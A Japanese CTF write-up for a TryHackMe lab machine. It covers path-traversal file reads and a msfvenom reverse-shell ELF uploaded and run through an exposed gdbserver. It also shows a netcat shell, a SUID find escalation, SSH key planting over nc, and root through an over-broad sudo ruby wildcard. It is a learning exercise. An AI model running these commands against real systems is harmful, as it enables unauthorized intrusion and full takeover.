# Airplane CTF

https://tryhackme.com/room/airplane

## Enumeration

```shell
TARGET=10.10.236.106
sudo bash -c "echo $TARGET   airplane.thm >> /etc/hosts"
```

### ポートスキャン

```shell
root@ip-10-10-160-115:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-25 00:09 BST
Nmap scan report for airplane.thm (10.10.236.106)
Host is up (0.00013s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
6048/tcp open  x11
8000/tcp open  http-alt
MAC Address: 02:68:C1:76:9B:CF (Unknown)
```

```shell
root@ip-10-10-160-115:~# sudo nmap -sS -A -p22,6048,8000 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-25 00:10 BST
Nmap scan report for airplane.thm (10.10.236.106)
Host is up (0.00021s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
6048/tcp open  x11?
8000/tcp open  http-alt Werkzeug/3.0.2 Python/3.8.10
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/3.0.2 Python/3.8.10
|     Date: Sat, 24 May 2025 23:10:41 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/3.0.2 Python/3.8.10
|     Date: Sat, 24 May 2025 23:10:36 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 269
|     Location: http://airplane.thm:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://airplane.thm:8000/?page=index.html">http://airplane.thm:8000/?page=index.html</a>. If not, click the link.
|   Socks5: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
| http-title: About Airplanes
|_Requested resource was http://airplane.thm:8000/?page=index.html
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=5/25%Time=683251EC%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1F3,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/3\.0\.2\
SF:x20Python/3\.8\.10\r\nDate:\x20Sat,\x2024\x20May\x202025\x2023:10:36\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20269\r\nLocation:\x20http://airplane\.thm:8000/\?page=index\.html\r\
SF:nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<ti
SF:tle>Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20sh
SF:ould\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x20URL
SF::\x20<a\x20href=\"http://airplane\.thm:8000/\?page=index\.html\">http:/
SF:/airplane\.thm:8000/\?page=index\.html</a>\.\x20If\x20not,\x20click\x20
SF:the\x20link\.\n")%r(FourOhFourRequest,184,"HTTP/1\.1\x20404\x20NOT\x20F
SF:OUND\r\nServer:\x20Werkzeug/3\.0\.2\x20Python/3\.8\.10\r\nDate:\x20Sat,
SF:\x2024\x20May\x202025\x2023:10:41\x20GMT\r\nContent-Type:\x20text/html;
SF:\x20charset=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close\r\n
SF:\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>404\x20Not\x20Found</
SF:title>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not
SF:\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20UR
SF:L\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20a
SF:gain\.</p>\n")%r(Socks5,213,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//D
SF:TD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://www
SF:\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20con
SF:tent=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<tit
SF:le>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20
SF:<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20syntax\x20\('\\x05
SF:\\x04\\x00\\x01\\x02\\x80\\x05\\x01\\x00\\x03'\)\.</p>\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_RE
SF:QUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.
SF:</p>\n\x20\x20\x20\x20</body>\n</html>\n");
MAC Address: 02:68:C1:76:9B:CF (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.10 - 3.13 (94%), Linux 3.8 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH, HTTP(8000)。6048ポートが何かは不明。

### サブドメイン

```shell
ffuf -u http://airplane.thm:8000 -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.example.thm:8000' -fs 269
```

無し。

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://airplane.thm:8000 -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/airplane             (Status: 200) [Size: 655]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

/airplane のみ見つかったが、特に意味のないコンテンツだった。

## ファイルインクルージョン

http://airplane.thm:8000/?page=index.html

URLから、ファイルインクルージョンを疑う。

http://airplane.thm:8000/?page=../../../../etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
fwupd-refresh:x:122:127:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
geoclue:x:123:128::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:124:129:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
sssd:x:127:132:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
hudson:x:1001:1001::/home/hudson:/bin/bash
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
```

carlos, hudson ユーザーを発見。

- 2ユーザーのどちらも id_rsa は存在しなかった。
- 一般的なパスにアクセスログは存在しなかった。
- アプリのホームディレクトリとユーザーのホームディレクトリをファジングしたが、役に立つファイルは見つからなかった。

```shell
# 何も出なかった
ffuf -u http://airplane.thm:8000/?page=FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -fr 'Page not found'
ffuf -u http://airplane.thm:8000/?page=../../../../home/carlos/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -fr 'Page not found'

# hudsonユーザーのホームはアクセスできたが、役に立つファイルは見つからなかった。
ffuf -u http://airplane.thm:8000/?page=../../../../home/hudson/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -fr 'Page not found'

.profile                [Status: 200, Size: 807, Words: 128, Lines: 28]
.bashrc                 [Status: 200, Size: 3771, Words: 522, Lines: 118]
```

ここはどうしても分からずウォークスルーをチラ見した。

6048ポートを使っているコマンドを調べる。

```sh
seq 5000 > pid.txt

$ ffuf -u http://airplane.thm:8000/?page=../../../../proc/FUZZ/cmdline -c -w ./pid.txt -mr '6048'          

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://airplane.thm:8000/?page=../../../../proc/FUZZ/cmdline
 :: Wordlist         : FUZZ: /home/kali/ctf/airplane/pid.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: 6048
________________________________________________

549                     [Status: 200, Size: 41, Words: 1, Lines: 1, Duration: 266ms]
:: Progress: [5000/5000] :: Job [1/1] :: 74 req/sec :: Duration: [0:01:08] :: Errors: 0 ::
```

6048ポートをリッスンしていたのは、gdbserver だと分かった。

```shell
$ cat ../../Downloads/cmdline
/usr/bin/gdbserver0.0.0.0:6048airplane
```

HackTricks にリモート gdbserver を使ってリバースシェルを取得する方法が書かれている。

https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-remote-gdbserver.html?highlight=gdbserver#pentesting-remote-gdbserver

```shell
# Trick shared by @B1n4rySh4d0w
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.13.85.243 LPORT=6666 PrependFork=true -f elf -o binary.elf

chmod +x binary.elf

gdb binary.elf

# Set remote debuger target
target extended-remote 10.10.236.106:6048

# Upload elf file
remote put binary.elf /home/hudson/binary.elf

# Set remote executable file
set remote exec-file /home/hudson/binary.elf

# Execute reverse shell executable
run

# You should get your reverse-shell
```

かなり時間がかかるが、リバースシェルをとれた。

```shell
$ nc -nlvp 6666                                                                                                                        
listening on [any] 6666 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.236.106] 56988
id
uid=1001(hudson) gid=1001(hudson) groups=1001(hudson)
```

## 権限昇格１

find に carlos のSUIDが付いている。
```sh
hudson@airplane:/home/hudson$ find / -perm -u=s -type f -ls 2>/dev/null
   262477    316 -rwsr-xr-x   1 carlos   carlos     320160 Feb 18  2020 /usr/bin/find
```

hudsonに昇格成功

```sh
hudson@airplane:/home/hudson$ find . -exec /bin/sh -p \; -quit
$ id
uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
```

ユーザーフラグゲット。

## 権限昇格２

sudo -l を実行するためにパスワードがほしい。

FireFoxのプロファイルがあるので、ZIP化してローカルにコピー。

```sh
$ zip -r mozilla.zip ./.mozilla
```

firefox_decryptを使ったが読めなかった。

```sh
$ ./firefox_decrypt/firefox_decrypt.py ./.mozilla/firefox 
Select the Mozilla profile you wish to decrypt
1 -> nvjdjy1g.default
2 -> 7m3p2f5p.default-release
1
2025-05-25 10:56:29,330 - ERROR - Couldn't initialize NSS, maybe './.mozilla/firefox/nvjdjy1g.default' is not a valid profile?

$ ./firefox_decrypt/firefox_decrypt.py ./.mozilla/firefox
Select the Mozilla profile you wish to decrypt
1 -> nvjdjy1g.default
2 -> 7m3p2f5p.default-release
2
2025-05-25 10:56:31,949 - ERROR - Couldn't find credentials file (logins.json or signons.sqlite).
```

.cache/mozilla も試したが読めなかった。

パスワードはあきらめ、SSH接続を確立する。

ローカルで鍵ペアを作り、

```sh
ssh-keygen -t rsa
```

ターゲットのauthorized_keysに保存。

```sh
# ローカル
$ nc -nlvp 8888 < ./id_rsa.pub

# ターゲット
$ nc 10.13.85.243 8888 > .ssh/authorized_keys
```

SSH接続できた。

```sh
$ ssh carlos@10.10.236.106 -i ./id_rsa
```

sudo -l をパスワード無しで実行できた。

```sh
carlos@airplane:~$ sudo -l
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

ワイルドカードが広すぎるので任意のパスを指定できる。

```sh
carlos@airplane:~$ echo 'exec "/bin/sh"' > /home/carlos/test.rb
carlos@airplane:~$ sudo /usr/bin/ruby /root/../home/carlos/test.rb
# id
uid=0(root) gid=0(root) groups=0(root)
```

ルートフラグゲット！

```sh
# ls /root
root.txt  snap
# cat /root/root.txt
```

## 振り返り

- ファイルインクルージョンで /proc 配下を調べる価値を学んだ。
- リモート gdbserver を見つけたらリバースシェル取得のチャンス。
- SUID経由でシェルを起動したときに  sudo -l のパスワードを要求された場合でも、SSH接続したらパスワードが不要になる場合がある。
